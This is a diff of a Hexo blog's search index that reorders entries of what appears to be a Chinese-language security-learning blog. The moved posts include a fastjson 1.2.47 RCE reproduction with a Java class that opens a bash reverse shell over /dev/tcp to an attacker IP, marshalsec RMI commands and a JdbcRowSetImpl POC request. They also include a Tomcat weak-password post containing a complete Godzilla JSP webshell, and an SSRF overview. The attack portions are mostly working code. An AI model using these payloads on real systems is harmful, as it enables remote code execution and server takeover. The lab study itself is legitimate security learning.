@@ -316,11 +316,6 @@
       </tags>
   </entry>
   <entry>
-    <title>dnslog盲打</title>
-    <url>/2021/09/18/dnslog%E7%9B%B2%E6%89%93/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>docker基本使用</title>
     <url>/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><a href="https://blog.csdn.net/wzsy_ll/article/details/82866627">docker安装教程</a></p>
@@ -381,6 +376,11 @@
       <tags>
         <tag>docker</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>dnslog盲打</title>
+    <url>/2021/09/18/dnslog%E7%9B%B2%E6%89%93/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>fastjson-1.2.24-rce</title>
@@ -470,62 +470,6 @@
       </tags>
   </entry>
   <entry>
-    <title>fastjson 1.2.47-rce</title>
-    <url>/2021/09/20/fastjson-1-2-47-rce/</url>
-    <content><![CDATA[<h2 id="fastjson-1-2-47-rce"><a href="#fastjson-1-2-47-rce" class="headerlink" title="fastjson 1.2.47-rce"></a>fastjson 1.2.47-rce</h2><p><img src="https://i.loli.net/2021/09/22/nuHJF8jqwGcCmXz.png" alt="img"></p>
-<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>靶机：jdk1.8.0_301、Apache Maven 3.3.9、fastjson1.2.47</p>
-<p>攻击机：jdk1.8.0_301、Apache Maven 3.3.9、marshalsec</p>
-<p><img src="https://i.loli.net/2021/09/22/mJi7VDOIvstxu4k.png" alt="image-20210922211752091"></p>
-<p>注意jdk版本会影响该漏洞复现</p>
-<ul>
-<li>两种不同协议实现反弹shell有jdk版本要求,<strong>而且最后接收shell的vps的JDK版本要和靶机的版本相近</strong></li>
-</ul>
-<blockquote>
-<p>下图jdk版本不存在该漏洞</p>
-<p><img src="https://i.loli.net/2021/09/22/Nw3SFaVJGCIRXg8.png" alt="img"></p>
-</blockquote>
-<p>访问8090端口</p>
-<p><img src="https://i.loli.net/2021/09/22/Z1IapGmlACtJzw2.png" alt="image-20210922200207047"></p>
-<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>同fastjson1.2.24复现步骤</p>
-<ul>
-<li>编译生成恶意类.class</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class Exploit &#123;</span><br><span class="line">    public Exploit()&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;&#x2F;bin&#x2F;bash -c $@|bash 0 echo bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;接收shell的ip&#x2F;8888 0&gt;&amp;1&quot;);</span><br><span class="line">        &#125;catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] argv)&#123;</span><br><span class="line">        Exploit e &#x3D; new Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<ul>
-<li>python开启一个临时web服务<code>SimpleHTTPServer</code></li>
-</ul>
-<p><code>python -m  SimpleHTTPServer 4444</code></p>
-<blockquote>
-<p><strong>为了接收LDAP服务重定向请求</strong>，并需要在payload目录下开启，这样才能访问到payload文件</p>
-</blockquote>
-<ul>
-<li>marshalsec开启LDAP或是RMI监听</li>
-</ul>
-<p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.j marshalsec.jndi.RMIRefServer &quot;http://攻击者ip:4444/#Exploit&quot; 9999</code></p>
-<blockquote>
-<p>借助LDAP服务将LDAP reference result 重定向到web服务器</p>
-<p>LDAP动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管</p>
-</blockquote>
-<ul>
-<li>burp发送poc</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 靶机ip</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko&#x2F;20100101 Firefox&#x2F;18.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q&#x3D;0.8,en-us;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 264</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;攻击者ip:9999&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="https://i.loli.net/2021/09/23/YgxWpiS7dbhQnoH.png" alt="image-20210923113053182"></p>
-<p>注：所有的工具和编译文件要放在同一目录下，并且python开启http服务也在当前目录</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/null1433/p/12697682.html">https://www.cnblogs.com/null1433/p/12697682.html</a></p>
-<p><a href="https://blog.csdn.net/qq_40989258/article/details/103049474">https://blog.csdn.net/qq_40989258/article/details/103049474</a></p>
-<p><a href="https://www.cnblogs.com/hei-zi/p/13274272.html">https://www.cnblogs.com/hei-zi/p/13274272.html</a></p>
-<p><a href="https://www.cnblogs.com/Welk1n/p/11446519.html">fastjson漏洞分析利用</a></p>
-]]></content>
-      <tags>
-        <tag>fastjson</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>hexo初使用</title>
     <url>/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<blockquote>
@@ -583,6 +527,62 @@
       </categories>
       <tags>
         <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>fastjson 1.2.47-rce</title>
+    <url>/2021/09/20/fastjson-1-2-47-rce/</url>
+    <content><![CDATA[<h2 id="fastjson-1-2-47-rce"><a href="#fastjson-1-2-47-rce" class="headerlink" title="fastjson 1.2.47-rce"></a>fastjson 1.2.47-rce</h2><p><img src="https://i.loli.net/2021/09/22/nuHJF8jqwGcCmXz.png" alt="img"></p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>靶机：jdk1.8.0_301、Apache Maven 3.3.9、fastjson1.2.47</p>
+<p>攻击机：jdk1.8.0_301、Apache Maven 3.3.9、marshalsec</p>
+<p><img src="https://i.loli.net/2021/09/22/mJi7VDOIvstxu4k.png" alt="image-20210922211752091"></p>
+<p>注意jdk版本会影响该漏洞复现</p>
+<ul>
+<li>两种不同协议实现反弹shell有jdk版本要求,<strong>而且最后接收shell的vps的JDK版本要和靶机的版本相近</strong></li>
+</ul>
+<blockquote>
+<p>下图jdk版本不存在该漏洞</p>
+<p><img src="https://i.loli.net/2021/09/22/Nw3SFaVJGCIRXg8.png" alt="img"></p>
+</blockquote>
+<p>访问8090端口</p>
+<p><img src="https://i.loli.net/2021/09/22/Z1IapGmlACtJzw2.png" alt="image-20210922200207047"></p>
+<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>同fastjson1.2.24复现步骤</p>
+<ul>
+<li>编译生成恶意类.class</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class Exploit &#123;</span><br><span class="line">    public Exploit()&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;&#x2F;bin&#x2F;bash -c $@|bash 0 echo bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;接收shell的ip&#x2F;8888 0&gt;&amp;1&quot;);</span><br><span class="line">        &#125;catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] argv)&#123;</span><br><span class="line">        Exploit e &#x3D; new Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<ul>
+<li>python开启一个临时web服务<code>SimpleHTTPServer</code></li>
+</ul>
+<p><code>python -m  SimpleHTTPServer 4444</code></p>
+<blockquote>
+<p><strong>为了接收LDAP服务重定向请求</strong>，并需要在payload目录下开启，这样才能访问到payload文件</p>
+</blockquote>
+<ul>
+<li>marshalsec开启LDAP或是RMI监听</li>
+</ul>
+<p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.j marshalsec.jndi.RMIRefServer &quot;http://攻击者ip:4444/#Exploit&quot; 9999</code></p>
+<blockquote>
+<p>借助LDAP服务将LDAP reference result 重定向到web服务器</p>
+<p>LDAP动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管</p>
+</blockquote>
+<ul>
+<li>burp发送poc</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 靶机ip</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko&#x2F;20100101 Firefox&#x2F;18.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q&#x3D;0.8,en-us;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 264</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;攻击者ip:9999&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://i.loli.net/2021/09/23/YgxWpiS7dbhQnoH.png" alt="image-20210923113053182"></p>
+<p>注：所有的工具和编译文件要放在同一目录下，并且python开启http服务也在当前目录</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/null1433/p/12697682.html">https://www.cnblogs.com/null1433/p/12697682.html</a></p>
+<p><a href="https://blog.csdn.net/qq_40989258/article/details/103049474">https://blog.csdn.net/qq_40989258/article/details/103049474</a></p>
+<p><a href="https://www.cnblogs.com/hei-zi/p/13274272.html">https://www.cnblogs.com/hei-zi/p/13274272.html</a></p>
+<p><a href="https://www.cnblogs.com/Welk1n/p/11446519.html">fastjson漏洞分析利用</a></p>
+]]></content>
+      <tags>
+        <tag>fastjson</tag>
       </tags>
   </entry>
   <entry>
@@ -863,34 +863,9 @@
       </tags>
   </entry>
   <entry>
-    <title>tomcat8 弱口令</title>
-    <url>/2021/09/09/tomcat8-%E5%BC%B1%E5%8F%A3%E4%BB%A4/</url>
-    <content><![CDATA[<h2 id="tomcat8-弱口令"><a href="#tomcat8-弱口令" class="headerlink" title="tomcat8 弱口令"></a>tomcat8 弱口令</h2><p>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击</p>
-<p>用户权限在<code>conf/tomcat-users.xml</code>文件中配置</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;tomcat-users xmlns&#x3D;&quot;http:&#x2F;&#x2F;tomcat.apache.org&#x2F;xml&quot;</span><br><span class="line">              xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">              xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;tomcat.apache.org&#x2F;xml tomcat-users.xsd&quot;</span><br><span class="line">              version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-gui&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-script&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-jmx&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-status&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;admin-gui&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;admin-script&quot;&#x2F;&gt;</span><br><span class="line">    &lt;user username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;tomcat&quot; roles&#x3D;&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; &#x2F;&gt;</span><br><span class="line">    </span><br><span class="line">&lt;&#x2F;tomcat-users&gt;</span><br></pre></td></tr></table></figure>
-
-
-<p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限</p>
-<p>docker搭建环境</p>
-<p><img src="https://i.loli.net/2021/09/10/A64IXcg2RTUEzie.png" alt="image-20210910170730975"></p>
-<p>访问<code>xxx:8080/manager/html</code>弱口令tomcat、tomcat登录</p>
-<p><img src="https://i.loli.net/2021/09/10/vzZhNtUiDgGwF1x.png" alt="image-20210910171611943"></p>
-<p>找到上传点</p>
-<p>哥斯拉默认配置生成111.jsp，新建111文件夹，压缩后修改后缀为war</p>
-<blockquote>
-<p>111.jsp</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%! String xc&#x3D;&quot;3c6e0b8a9c15224a&quot;; String pass&#x3D;&quot;pass&quot;; String md5&#x3D;md5(pass+xc); class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c&#x3D;javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125; public static String md5(String s) &#123;String ret &#x3D; null;try &#123;java.security.MessageDigest m;m &#x3D; java.security.MessageDigest.getInstance(&quot;MD5&quot;);m.update(s.getBytes(), 0, s.length());ret &#x3D; new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();&#125; catch (Exception e) &#123;&#125;return ret; &#125; public static String base64Encode(byte[] bs) throws Exception &#123;Class base64;String value &#x3D; null;try &#123;base64&#x3D;Class.forName(&quot;java.util.Base64&quot;);Object Encoder &#x3D; base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);value &#x3D; (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64&#x3D;Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder &#x3D; base64.newInstance(); value &#x3D; (String)Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125; public static byte[] base64Decode(String bs) throws Exception &#123;Class base64;byte[] value &#x3D; null;try &#123;base64&#x3D;Class.forName(&quot;java.util.Base64&quot;);Object decoder &#x3D; base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);value &#x3D; (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64&#x3D;Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder &#x3D; base64.newInstance(); value &#x3D; (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125;%&gt;&lt;%try&#123;byte[] data&#x3D;base64Decode(request.getParameter(pass));data&#x3D;x(data, false);if (session.getAttribute(&quot;payload&quot;)&#x3D;&#x3D;null)&#123;session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));&#125;else&#123;request.setAttribute(&quot;parameters&quot;,data);java.io.ByteArrayOutputStream arrOut&#x3D;new java.io.ByteArrayOutputStream();Object f&#x3D;((Class)session.getAttribute(&quot;payload&quot;)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));&#125; &#125;catch (Exception e)&#123;&#125;%&gt;</span><br></pre></td></tr></table></figure>
-<p>上传111.war，连接</p>
-<p><img src="https://i.loli.net/2021/09/10/m1JPLjuZ8y2A7Oe.png" alt="image-20210910175031855"></p>
-<p><img src="https://i.loli.net/2021/09/10/xYRn934CsoJLW6M.png" alt="image-20210910175133308"></p>
-]]></content>
-      <categories>
-        <category>Tomcat</category>
-      </categories>
-      <tags>
-        <tag>Tomcat</tag>
-      </tags>
+    <title>thinkphp5 sql注入</title>
+    <url>/2021/10/28/thinkphp5-sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>tomcat rce cve-2017-12615</title>
@@ -1015,6 +990,36 @@
 <p><a href="http://hackdig.com/09/hack-130739.htm">文件包含漏洞之——tomcat CVE-2020-1938漏洞复现(getshell)</a></p>
 <p><a href="https://www.cnblogs.com/dogecheng/p/12604489.html">CVE-2020-1938 Apache Tomcat AJP文件包含漏洞</a></p>
 <p><a href="https://www.cnblogs.com/lcxblogs/p/14024827.html">msfvenom简介</a></p>
+]]></content>
+      <categories>
+        <category>Tomcat</category>
+      </categories>
+      <tags>
+        <tag>Tomcat</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>tomcat8 弱口令</title>
+    <url>/2021/09/09/tomcat8-%E5%BC%B1%E5%8F%A3%E4%BB%A4/</url>
+    <content><![CDATA[<h2 id="tomcat8-弱口令"><a href="#tomcat8-弱口令" class="headerlink" title="tomcat8 弱口令"></a>tomcat8 弱口令</h2><p>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击</p>
+<p>用户权限在<code>conf/tomcat-users.xml</code>文件中配置</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;tomcat-users xmlns&#x3D;&quot;http:&#x2F;&#x2F;tomcat.apache.org&#x2F;xml&quot;</span><br><span class="line">              xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">              xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;tomcat.apache.org&#x2F;xml tomcat-users.xsd&quot;</span><br><span class="line">              version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-gui&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-script&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-jmx&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;manager-status&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;admin-gui&quot;&#x2F;&gt;</span><br><span class="line">    &lt;role rolename&#x3D;&quot;admin-script&quot;&#x2F;&gt;</span><br><span class="line">    &lt;user username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;tomcat&quot; roles&#x3D;&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; &#x2F;&gt;</span><br><span class="line">    </span><br><span class="line">&lt;&#x2F;tomcat-users&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限</p>
+<p>docker搭建环境</p>
+<p><img src="https://i.loli.net/2021/09/10/A64IXcg2RTUEzie.png" alt="image-20210910170730975"></p>
+<p>访问<code>xxx:8080/manager/html</code>弱口令tomcat、tomcat登录</p>
+<p><img src="https://i.loli.net/2021/09/10/vzZhNtUiDgGwF1x.png" alt="image-20210910171611943"></p>
+<p>找到上传点</p>
+<p>哥斯拉默认配置生成111.jsp，新建111文件夹，压缩后修改后缀为war</p>
+<blockquote>
+<p>111.jsp</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%! String xc&#x3D;&quot;3c6e0b8a9c15224a&quot;; String pass&#x3D;&quot;pass&quot;; String md5&#x3D;md5(pass+xc); class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c&#x3D;javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125; public static String md5(String s) &#123;String ret &#x3D; null;try &#123;java.security.MessageDigest m;m &#x3D; java.security.MessageDigest.getInstance(&quot;MD5&quot;);m.update(s.getBytes(), 0, s.length());ret &#x3D; new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();&#125; catch (Exception e) &#123;&#125;return ret; &#125; public static String base64Encode(byte[] bs) throws Exception &#123;Class base64;String value &#x3D; null;try &#123;base64&#x3D;Class.forName(&quot;java.util.Base64&quot;);Object Encoder &#x3D; base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);value &#x3D; (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64&#x3D;Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder &#x3D; base64.newInstance(); value &#x3D; (String)Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125; public static byte[] base64Decode(String bs) throws Exception &#123;Class base64;byte[] value &#x3D; null;try &#123;base64&#x3D;Class.forName(&quot;java.util.Base64&quot;);Object decoder &#x3D; base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);value &#x3D; (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64&#x3D;Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder &#x3D; base64.newInstance(); value &#x3D; (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125;%&gt;&lt;%try&#123;byte[] data&#x3D;base64Decode(request.getParameter(pass));data&#x3D;x(data, false);if (session.getAttribute(&quot;payload&quot;)&#x3D;&#x3D;null)&#123;session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));&#125;else&#123;request.setAttribute(&quot;parameters&quot;,data);java.io.ByteArrayOutputStream arrOut&#x3D;new java.io.ByteArrayOutputStream();Object f&#x3D;((Class)session.getAttribute(&quot;payload&quot;)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));&#125; &#125;catch (Exception e)&#123;&#125;%&gt;</span><br></pre></td></tr></table></figure>
+<p>上传111.war，连接</p>
+<p><img src="https://i.loli.net/2021/09/10/m1JPLjuZ8y2A7Oe.png" alt="image-20210910175031855"></p>
+<p><img src="https://i.loli.net/2021/09/10/xYRn934CsoJLW6M.png" alt="image-20210910175133308"></p>
 ]]></content>
       <categories>
         <category>Tomcat</category>
@@ -1346,6 +1351,97 @@
       </tags>
   </entry>
   <entry>
+    <title>常见web漏洞学习之SSRF</title>
+    <url>/2021/07/15/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BSSRF/</url>
+    <content><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><img src="https://i.loli.net/2021/07/17/FxWvNe42sRnGHqt.png" alt="image-20210717161639133"></p>
+<p><img src="https://i.loli.net/2021/07/17/smd1vkM65KeSaHn.png" alt="image-20210717161814292"></p>
+<p><img src="https://i.loli.net/2021/07/17/UvSWRuVZxiHkomn.png" alt="image-20210717161911196"></p>
+<p><img src="https://i.loli.net/2021/07/17/HsaJXe45FlEY9cL.jpg" alt="img"></p>
+<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>Server Side Request Forgery 服务端请求伪造</p>
+<p>是由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF攻击的目标是从外网无法访问的内部系统</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>很多web应用都提供了从其他的服务器上获取数据的功能，如使用指定的url，web应用就可以获取图片，下载文件，读取文件内容等（这个url是远程的url，并不是本地的，<del>说了个废话</del>）</p>
+<p>SSRF的实质是<strong>利用存在缺陷的web应用作为代理来进行攻击</strong>远程和本地的服务器</p>
+<p>SSRF形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>且没有<strong>对目标地址做过滤与限制</strong></p>
+<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p><img src="https://i.loli.net/2021/07/18/HKf8lbk4BOJeNdA.jpg" alt="9907e251f785494d92c746eb5df60541"></p>
+<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
+<li>内外网的端口和服务扫描</li>
+<li>对内网Web应用进行指纹识别，识别企业内部的资产信息，通过访问默认文件实现(如：readme文件)</li>
+<li>攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等</li>
+<li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li>
+<li>下载内网资源，利用file协议读取本地敏感数据文件等</li>
+<li>进行跳板</li>
+</ul>
+<h3 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h3><ul>
+<li>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</li>
+<li>http/https协议：探测内网主机存活</li>
+<li>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</li>
+<li>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</li>
+</ul>
+<h3 id="weblogic-ssrf复现"><a href="#weblogic-ssrf复现" class="headerlink" title="weblogic ssrf复现"></a>weblogic ssrf复现</h3><h4 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h4><p><img src="https://i.loli.net/2021/07/18/64S8lLxKy1sbThH.png" alt="image-20210718153704526"></p>
+<p>查看靶场说明</p>
+<p>进入weblogic的ssrf的目录下，使用<code>gedit</code>命令查看<code>README.md</code></p>
+<p><img src="https://i.loli.net/2021/07/18/NioHV94KcWQdUkC.png" alt="image-20210718154456328"></p>
+<p>xshell会让提示下Xmanger</p>
+<p><img src="https://i.loli.net/2021/07/18/AdLikoaK5s18p9V.png" alt="image-20210718154647511"></p>
+<p>直接下本地看</p>
+<p>访问<code>ip:7001/uddiexplorer/</code>，无需登录即可查看uddiexplorer应用</p>
+<p><img src="https://i.loli.net/2021/07/18/SlbMwNYxXPvj9aQ.png" alt="image-20210718155843581"></p>
